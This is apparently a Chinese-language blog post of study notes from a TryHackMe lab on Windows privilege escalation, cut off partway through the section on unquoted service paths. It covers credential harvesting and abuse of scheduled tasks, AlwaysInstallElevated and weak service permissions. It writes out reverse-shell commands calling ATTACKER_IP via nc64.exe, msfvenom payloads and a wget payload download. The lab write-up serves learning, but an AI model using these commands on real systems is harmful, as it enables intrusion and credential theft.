<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>THM-Windows权限提升 | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>THM-Windows权限提升</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2024-02-06T02:17:59.893Z" id="date"> 2024-02-06</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2024-02-06T04:29:42.613Z" id="updated"> 2024-02-06</time></div></span><br><span>文章总字数: <div class="control">10.6k</div></span><br><span>预计阅读时间: <div class="control">41 分钟</div></span></div></div><hr><div id="post-content"><h1>0x01 前言</h1>
<p>最近在tryhackme中学到了Windows渗透相关知识，在此之前学的有些东西忘记记录了，但实际上也没有记录的必要性，故此不管了。这里就记录Windows提权的某些知识点。</p>
<h1>0x02 简介</h1>
<p>简而言之，权限升级包括使用“用户 A”对主机的给定访问权限，并通过滥用目标系统中的弱点来利用它来获得对“用户 B”的访问权限。虽然我们通常希望“用户 B”拥有管理权限，但在某些情况下，我们可能需要升级到其他非特权帐户，然后才能真正获得管理权限。</p>
<p>获得对不同帐户的访问权限就像在一些粗心的用户留下的不安全的文本文件或电子表格中查找凭据一样简单，但情况并非总是如此。根据具体情况，我们可能需要利用以下一些弱点：</p>
<ul>
<li>Windows 服务或计划任务配置错误</li>
<li>分配给我们帐户的权限过多</li>
<li>易受攻击的软件</li>
<li>缺少 Windows 安全补丁</li>
</ul>
<p>在开始讨论实际技术之前，让我们先了解一下 Windows 系统上的不同帐户类型。</p>
<h1>0x03 Windows用户</h1>
<p>Windows系统主要有两类用户。根据用户的访问级别，我们可以将用户分为以下组之一：</p>
<table>
<thead>
<tr>
<th><strong>Administrators 管理员</strong></th>
<th>这些用户拥有最多的权限。他们可以更改任何系统配置参数并访问系统中的任何文件。</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Standard Users 标准用户</strong></td>
<td>这些用户可以访问计算机，但只能执行有限的任务。通常，这些用户无法对系统进行永久或重要的更改，并且仅限于他们的文件。</td>
</tr>
</tbody>
</table>
<p>任何具有管理权限的用户都将成为管理员组的一部分。另一方面，标准用户是用户组的一部分。</p>
<p>除此之外，您通常会听说操作系统在权限升级的情况下使用一些特殊的内置帐户：</p>
<table>
<thead>
<tr>
<th><strong>SYSTEM / LocalSystem 系统/本地系统</strong></th>
<th>操作系统用来执行内部任务的帐户。它可以完全访问主机上可用的所有文件和资源，并且具有比管理员更高的权限。</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Local Service 本地服务</strong></td>
<td>用于以“最低”权限运行 Windows 服务的默认帐户。它将使用网络上的匿名连接。</td>
</tr>
<tr>
<td><strong>Network Service 网络服务</strong></td>
<td>用于以“最低”权限运行 Windows 服务的默认帐户。它将使用计算机凭据通过网络进行身份验证。</td>
</tr>
</tbody>
</table>
<p>这些帐户由 Windows 创建和管理，您将无法像其他常规帐户一样使用它们。不过，在某些情况下，您可能会因为利用特定服务而获得他们的特权。</p>
<h1>0x03 Windows密码收集</h1>
<p>获得其他用户访问权限的最简单方法是从受感染的计算机收集凭据。此类凭证的存在可能有多种原因，包括粗心的用户将其留在明文文件中；甚至由浏览器或电子邮件客户端等软件存储。</p>
<h2 id="3-1-Windows-installations"><a href="#3-1-Windows-installations" class="headerlink" title="3-1-Windows-installations"></a>3.1 Windows installations</h2>
<p>在大量主机上安装 Windows 时，管理员可以使用 Windows 部署服务，该服务允许通过网络将单个操作系统映像部署到多台主机。此类安装称为无人值守安装，因为它们不需要用户交互。此类安装需要使用管理员帐户来执行初始设置，该设置最终可能存储在计算机中的以下位置：</p>
<ul>
<li>C:\Unattend.xml</li>
<li>C:\Windows\Panther\Unattend.xml</li>
<li>C:\Windows\Panther\Unattend\Unattend.xml</li>
<li>C:\Windows\system32\sysprep.inf</li>
<li>C:\Windows\system32\sysprep\sysprep.xml</li>
</ul>
<p>作为这些文件的一部分，您可能会遇到凭据：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Credentials</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Username</span>&gt;</span>Administrator<span class="hljs-tag">&lt;/<span class="hljs-name">Username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Domain</span>&gt;</span>thm.local<span class="hljs-tag">&lt;/<span class="hljs-name">Domain</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Password</span>&gt;</span>MyPassword123<span class="hljs-tag">&lt;/<span class="hljs-name">Password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Credentials</span>&gt;</span><br></code></pre></td></tr></table></figure>
<h2 id="3-2-Powershell-History"><a href="#3-2-Powershell-History" class="headerlink" title="3-2-Powershell-History"></a>3.2 Powershell History</h2>
<p>每当用户使用 Powershell 运行命令时，它都会存储到一个文件中，该文件会保留过去的命令。这对于快速重复之前使用过的命令很有用。如果用户直接在 Powershell 命令行中运行包含密码的命令，则稍后可以在 <code>cmd.exe</code> 提示符下使用以下命令来检索该密码：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history<span class="hljs-selector-class">.txt</span><br></code></pre></td></tr></table></figure>
<p>注意：上面的命令只能在 cmd.exe 中运行，因为 Powershell 不会将 <code>%userprofile%</code> 识别为环境变量。要从 Powershell 读取文件，您必须将 <code>%userprofile%</code> 替换为 <code>$Env:userprofile</code> 。</p>
<h2 id="3-3-Windows-Credentials"><a href="#3-3-Windows-Credentials" class="headerlink" title="3-3-Windows-Credentials"></a>3.3 Windows Credentials</h2>
<p>Windows 允许我们使用其他用户的凭据。此功能还提供了将这些凭据保存在系统上的选项。下面的命令将列出保存的凭据：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">cmdkey /list<br></code></pre></td></tr></table></figure>
<p>虽然您看不到实际的密码，但如果您发现任何值得尝试的凭据，则可以将它们与 <code>runas</code> 命令和 <code>/savecred</code> 选项一起使用，如下所示。</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">runas /savecred /user:admin cmd.exe<br>//上述的user:admin可分别用对应的hash值替换<br></code></pre></td></tr></table></figure>
<h2 id="3-4-IIS-Configuration"><a href="#3-4-IIS-Configuration" class="headerlink" title="3-4-IIS-Configuration"></a>3.4 IIS Configuration</h2>
<p>Internet 信息服务 (IIS) 是 Windows 安装上的默认 Web 服务器。 IIS 上网站的配置存储在名为 <code>web.config</code> 的文件中，并且可以存储数据库的密码或配置的身份验证机制。根据安装的 IIS 版本，我们可以在以下位置之一找到 web.config：</p>
<ul>
<li>C:\inetpub\wwwroot\web.config</li>
<li>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</li>
</ul>
<p>这是在文件上查找数据库连接字符串的快速方法：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">type C:\Windows\Microsoft.NET\Framework64\v4.<span class="hljs-number">0.30319</span>\Config\web.config | findstr connectionString<br></code></pre></td></tr></table></figure>
<h2 id="3-5-从软件检索凭证：PuTTY"><a href="#3-5-从软件检索凭证：PuTTY" class="headerlink" title="3-5-从软件检索凭证：PuTTY"></a>3.5 从软件检索凭证：PuTTY</h2>
<p>PuTTY 是 Windows 系统上常见的 SSH 客户端。用户不必每次都指定连接参数，而是可以存储会话，其中可以存储 IP、用户和其他配置以供以后使用。虽然 PuTTY 不允许用户存储其 SSH 密码，但它将存储包含明文身份验证凭据的代理配置。</p>
<p>要检索存储的代理凭据，您可以使用以下命令在以下注册表项下搜索 ProxyPassword：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s<br></code></pre></td></tr></table></figure>
<p>注意：Simon Tatham 是 PuTTY 的创建者（他的名字是路径的一部分），而不是我们要检索密码的用户名。运行上述命令后，存储的代理用户名也应该可见。</p>
<p>正如 putty 存储凭据一样，任何存储密码的软件，包括浏览器、电子邮件客户端、FTP 客户端、SSH 客户端、VNC 软件等，都将有方法恢复用户保存的任何密码。</p>
<h1>0x04 权限提升</h1>
<h2 id="4-1-Scheduled-Tasks-计划任务"><a href="#4-1-Scheduled-Tasks-计划任务" class="headerlink" title="4-1-Scheduled-Tasks-计划任务"></a>4.1 Scheduled Tasks -计划任务</h2>
<p>查看目标系统上的计划任务，您可能会看到计划任务丢失了其二进制文件或正在使用您可以修改的二进制文件。</p>
<p>可以使用不带任何选项的 <code>schtasks</code> 命令从命令行列出计划任务。要检索有关任何服务的详细信息，您可以使用如下命令：</p>
<p>可以使用不带任何选项的 <code>schtasks</code> 命令从命令行列出计划任务。要检索有关任何服务的详细信息，您可以使用如下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; schtasks /query /tn vulntask /fo list /v<br>Folder: \<br>HostName:                             THM-PC1<br>TaskName:                             \vulntask<br>Task To Run:                          C:\tasks\schtask.bat<br>Run As User:                          taskusr1<br></code></pre></td></tr></table></figure>
<p>您将获得有关该任务的大量信息，但对我们来说重要的是“Task To Run”参数，该参数指示计划任务执行的内容，以及“Run As User”参数，该参数显示将使用的用户执行任务。</p>
<p>如果我们当前的用户可以修改或覆盖“要运行的任务”可执行文件，我们就可以控制 taskusr1 用户执行的内容，从而实现简单的权限提升。要检查可执行文件的文件权限，我们使用 <code>icacls</code> ：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; icacls c:\tasks\schtask.bat<br>c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)<br>                    BUILTIN\Administrators:(I)(F)<br>                    BUILTIN\Users:(I)(F)<br></code></pre></td></tr></table></figure>
<p>从结果中可以看出，BUILTIN\Users 组对任务的二进制文件具有完全访问权限 (F)。这意味着我们可以修改 .bat 文件并插入我们喜欢的任何有效负载。为了您的方便，可以在 <code>C:\tools</code> 上找到 <code>nc64.exe</code> 。让我们更改 bat 文件以生成反向 shell：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP <span class="hljs-number">4444</span> &gt; C:\tasks\schtask.bat<br></code></pre></td></tr></table></figure>
<p>然后，我们在攻击者机器上启动一个侦听器，该侦听器位于我们在反向 shell 上指示的同一端口上：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">nc -lvp <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>
<p>下次运行计划任务时，您应该会收到具有taskusr1权限的反向shell。虽然您可能无法在实际场景中启动任务，而必须等待计划任务触发（但我们为您的用户提供了手动启动任务的权限，以节省您的时间。我们可以使用以下命令运行该任务）</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; schtasks /run /tn vulntask<br></code></pre></td></tr></table></figure>
<p>您将按预期收到具有taskusr1权限的反向shell：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ nc -lvp <span class="hljs-number">4444</span><br>Listening on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> <span class="hljs-number">4444</span><br>Connection received on <span class="hljs-number">10.10</span>.<span class="hljs-number">175.90</span> <span class="hljs-number">50649</span><br>Microsoft Windows [Version <span class="hljs-number">10.0</span>.<span class="hljs-number">17763.1821</span>]<br>(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.<br><br><span class="hljs-attribute">C</span>:\Windows\system32&gt;whoami<br>wprivesc1\taskusr1<br></code></pre></td></tr></table></figure>
<h2 id="4-2-AlwaysInstallElevated-始终安装提升"><a href="#4-2-AlwaysInstallElevated-始终安装提升" class="headerlink" title="4-2-AlwaysInstallElevated-始终安装提升"></a>4.2 AlwaysInstallElevated -始终安装提升</h2>
<p>Windows 安装程序文件（也称为 .msi 文件）用于在系统上安装应用程序。它们通常以启动它的用户的权限级别运行。但是，可以将它们配置为从任何用户帐户（甚至是非特权帐户）以更高的权限运行。这可能会让我们生成一个以管理员权限运行的恶意 MSI 文件。</p>
<p>注意：AlwaysInstallElevated 方法在此房间的计算机上不起作用，它仅供参考。</p>
<p>此方法需要设置两个注册表值。您可以使用以下命令从命令行查询这些内容。</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer<br>C:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer<br></code></pre></td></tr></table></figure>
<p>为了能够利用此漏洞，两者都应该设置。否则，利用将是不可能的。如果设置了这些，您可以使用 <code>msfvenom</code> 生成恶意 .msi 文件，如下所示：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious<span class="hljs-selector-class">.msi</span><br></code></pre></td></tr></table></figure>
<p>由于这是一个反向 shell，您还应该运行相应配置的 Metasploit 处理程序模块。传输创建的文件后，您可以使用以下命令运行安装程序并接收反向 shell：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi<br></code></pre></td></tr></table></figure>
<h2 id="4-3-Windows-Services"><a href="#4-3-Windows-Services" class="headerlink" title="4-3-Windows-Services"></a>4.3 Windows Services</h2>
<p>Windows 服务由服务控制管理器 (SCM) 管理。 SCM 是一个负责根据需要管理服务状态、检查任何给定服务的当前状态并通常提供配置服务的方法的进程。</p>
<p>Windows 计算机上的每个服务都有一个关联的可执行文件，每当服务启动时，SCM 都会运行该可执行文件。需要注意的是，服务可执行文件实现特殊功能以便能够与 SCM 通信，因此任何可执行文件都不能作为服务成功启动。每个服务还指定该服务将在其下运行的用户帐户。</p>
<p>为了更好地理解服务的结构，让我们使用 <code>sc qc</code> 命令检查 apphostsvc 服务配置：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; sc qc apphostsvc<br>[SC] QueryServiceConfig SUCCESS<br><br>SERVICE_NAME: apphostsvc<br>        TYPE               : <span class="hljs-number">20</span>  WIN32_SHARE_PROCESS<br>        START_TYPE         : <span class="hljs-number">2</span>   AUTO_START<br>        ERROR_CONTROL      : <span class="hljs-number">1</span>   NORMAL<br>        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost<br>        LOAD_ORDER_GROUP   :<br>        TAG                : <span class="hljs-number">0</span><br>        DISPLAY_NAME       : Application Host Helper Service<br>        DEPENDENCIES       :<br>        SERVICE_START_NAME : localSystem<br></code></pre></td></tr></table></figure>
<p>在这里我们可以看到关联的可执行文件是通过 BINARY_PATH_NAME 参数指定的，用于运行服务的帐户显示在 SERVICE_START_NAME 参数上。</p>
<p>服务有一个自主访问控制列表（DACL），它指示谁有权启动、停止、暂停、查询状态、查询配置或重新配置服务以及其他权限。 DACL 可以从 Process Hacker 中看到（可以在您的计算机桌面上找到）：</p>
<p class='item-img' data-src='C:/Users/%E4%BB%98%E6%80%9D%E9%92%A7/AppData/Roaming/Typora/typora-user-images/image-20240206103905671.png'><img src="C:/Users/%E4%BB%98%E6%80%9D%E9%92%A7/AppData/Roaming/Typora/typora-user-images/image-20240206103905671.png" alt="image-20240206103905671"></p>
<p>所有服务配置都存储在注册表中的 <code>HKLM\SYSTEM\CurrentControlSet\Services\</code> 下：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206103915222.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206103915222.png" alt="image-20240206103915222"></p>
<p>系统中的每个服务都存在一个子项。同样，我们可以在 ImagePath 值上看到关联的可执行文件，并在 ObjectName 值上看到用于启动服务的帐户。如果已为该服务配置了 DACL，它将存储在名为 Security 的子项中。正如您现在已经猜到的，默认情况下只有管理员可以修改此类注册表项。</p>
<h2 id="4-4-服务可执行文件的不安全权限"><a href="#4-4-服务可执行文件的不安全权限" class="headerlink" title="4-4-服务可执行文件的不安全权限"></a>4.4 服务可执行文件的不安全权限</h2>
<p>如果与服务关联的可执行文件的权限较弱，允许攻击者修改或替换它，则攻击者可以轻松获得该服务帐户的权限。</p>
<p>为了了解其工作原理，让我们看一下 Splinterware System Scheduler 上发现的漏洞。首先，我们将使用 <code>sc</code> 查询服务配置：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; sc qc WindowsScheduler<br>[SC] QueryServiceConfig SUCCESS<br><br>SERVICE_NAME: windowsscheduler<br>        TYPE               : <span class="hljs-number">10</span>  WIN32_OWN_PROCESS<br>        START_TYPE         : <span class="hljs-number">2</span>   AUTO_START<br>        ERROR_CONTROL      : <span class="hljs-number">0</span>   IGNORE<br>        BINARY_PATH_NAME   : C:\PROGRA~<span class="hljs-number">2</span>\SYSTEM~<span class="hljs-number">1</span>\WService.exe<br>        LOAD_ORDER_GROUP   :<br>        TAG                : <span class="hljs-number">0</span><br>        DISPLAY_NAME       : System Scheduler Service<br>        DEPENDENCIES       :<br>        SERVICE_START_NAME : .\svcuser1<br></code></pre></td></tr></table></figure>
<p>我们可以看到漏洞软件安装的服务以 svcuser1 身份运行，与该服务关联的可执行文件位于 <code>C:\Progra~2\System~1\WService.exe</code> 中。然后我们继续检查可执行文件的权限：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\Users\thm-unpriv&gt;icacls C:\PROGRA~<span class="hljs-number">2</span>\SYSTEM~<span class="hljs-number">1</span>\WService.exe<br>C:\PROGRA~<span class="hljs-number">2</span>\SYSTEM~<span class="hljs-number">1</span>\WService.exe Everyone:(I)(M)<br>                                  NT AUTHORITY\SYSTEM:(I)(F)<br>                                  BUILTIN\Administrators:(I)(F)<br>                                  BUILTIN\Users:(I)(RX)<br>                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)<br>                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)<br><br>Successfully processed <span class="hljs-number">1</span> files; Failed processing <span class="hljs-number">0</span> files<br></code></pre></td></tr></table></figure>
<p>这里有一些有趣的事情。 Everyone 组对服务的可执行文件具有修改权限 (M)。这意味着我们可以简单地用我们偏好的任何有效负载覆盖它，并且该服务将使用配置的用户帐户的权限执行它。</p>
<p>让我们使用 msfvenom 生成一个 exe-service 负载并通过 python Web 服务器提供它：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=<span class="hljs-number">4445</span> -f exe-service -o rev-svc.exe<br><br>user<span class="hljs-keyword">@attackerpc</span>$ python3 -m http.server<br>Serving HTTP on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> port <span class="hljs-number">8000</span> (<span class="hljs-attribute">http</span>://<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8000</span>/) ...<br></code></pre></td></tr></table></figure>
<p>然后我们可以使用以下命令从 Powershell 中提取有效负载：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">wget http://ATTACKER_IP:<span class="hljs-number">8000</span>/rev-svc.exe -O rev-svc.exe<br></code></pre></td></tr></table></figure>
<p>一旦有效负载位于 Windows 服务器中，我们就继续用有效负载替换服务可执行文件。由于我们需要另一个用户来执行我们的有效负载，因此我们还希望向Everyone组授予完全权限：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; cd C:\PROGRA~<span class="hljs-number">2</span>\SYSTEM~<span class="hljs-number">1</span>\<br><br>C:\PROGRA~<span class="hljs-number">2</span>\SYSTEM~<span class="hljs-number">1</span>&gt; move WService.exe WService.exe.bkp<br>        <span class="hljs-number">1</span> <span class="hljs-built_in">file</span>(s) moved.<br><br>C:\PROGRA~<span class="hljs-number">2</span>\SYSTEM~<span class="hljs-number">1</span>&gt; move C:\Users\thm-unpriv\rev-svc.exe WService.exe<br>        <span class="hljs-number">1</span> <span class="hljs-built_in">file</span>(s) moved.<br><br>C:\PROGRA~<span class="hljs-number">2</span>\SYSTEM~<span class="hljs-number">1</span>&gt; icacls WService.exe /grant Everyone:F<br>        Successfully processed <span class="hljs-number">1</span> files.<br></code></pre></td></tr></table></figure>
<p>我们在攻击者机器上启动一个反向侦听器：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ nc -lvp <span class="hljs-number">4445</span><br></code></pre></td></tr></table></figure>
<p>最后，重新启动服务。虽然在正常情况下，您可能需要等待服务重新启动，但您已被分配了自行重新启动服务的权限，以节省一些时间。从 cmd.exe 命令提示符使用以下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; sc stop windowsscheduler<br>C:\&gt; sc start windowsscheduler<br></code></pre></td></tr></table></figure>
<p>注意：PowerShell 将 <code>sc</code> 作为 <code>Set-Content</code> 的别名，因此您需要使用 <code>sc.exe</code> 才能以这种方式使用 PowerShell 控制服务。</p>
<p>结果，您将获得具有 svcusr1 权限的反向 shell：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ nc -lvp <span class="hljs-number">4445</span><br>Listening on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> <span class="hljs-number">4445</span><br>Connection received on <span class="hljs-number">10.10</span>.<span class="hljs-number">175.90</span> <span class="hljs-number">50649</span><br>Microsoft Windows [Version <span class="hljs-number">10.0</span>.<span class="hljs-number">17763.1821</span>]<br>(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.<br><br><span class="hljs-attribute">C</span>:\Windows\system32&gt;whoami<br>wprivesc1\svcusr1<br></code></pre></td></tr></table></figure>
<h2 id="4-5-未加引号的服务路径"><a href="#4-5-未加引号的服务路径" class="headerlink" title="4-5-未加引号的服务路径"></a>4.5 未加引号的服务路径</h2>
<p>当我们无法像以前一样直接写入服务可执行文件时，仍然有机会通过使用相当模糊的功能来强制服务运行任意可执行文件。</p>
<p>使用 Windows 服务时，当服务配置为指向“未加引号”的可执行文件时，会出现非常特殊的行为。不加引号是指未正确引用关联可执行文件的路径以解决命令中的空格问题。</p>
<p>作为示例，让我们看一下两个服务之间的区别（这些服务仅用作示例，可能在您的计算机中不可用）。第一个服务将使用正确的引用，以便 SCM 毫无疑问地知道它必须执行 <code>&quot;C:\Program Files\RealVNC\VNC Server\vncserver.exe&quot;</code> 指向的二进制文件，后跟给定的参数：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; sc qc <span class="hljs-string">&quot;vncserver&quot;</span><br>[SC] QueryServiceConfig SUCCESS<br><br>SERVICE_NAME: vncserver<br>        TYPE               : <span class="hljs-number">10</span>  WIN32_OWN_PROCESS<br>        START_TYPE         : <span class="hljs-number">2</span>   AUTO_START<br>        ERROR_CONTROL      : <span class="hljs-number">0</span>   IGNORE<br>        BINARY_PATH_NAME   : <span class="hljs-string">&quot;C:\Program Files\RealVNC\VNC Server\vncserver.exe&quot;</span> -service<br>        LOAD_ORDER_GROUP   :<br>        TAG                : <span class="hljs-number">0</span><br>        DISPLAY_NAME       : VNC Server<br>        DEPENDENCIES       :<br>        SERVICE_START_NAME : LocalSystem<br></code></pre></td></tr></table></figure>
<p><strong>请记住：PowerShell 将“sc”作为“Set-Content”的别名，因此，如果您处于 PowerShell 提示符中，则需要使用“sc.exe”来控制服务。</strong></p>
<p>现在让我们看看另一项没有正确报价的服务：</p>
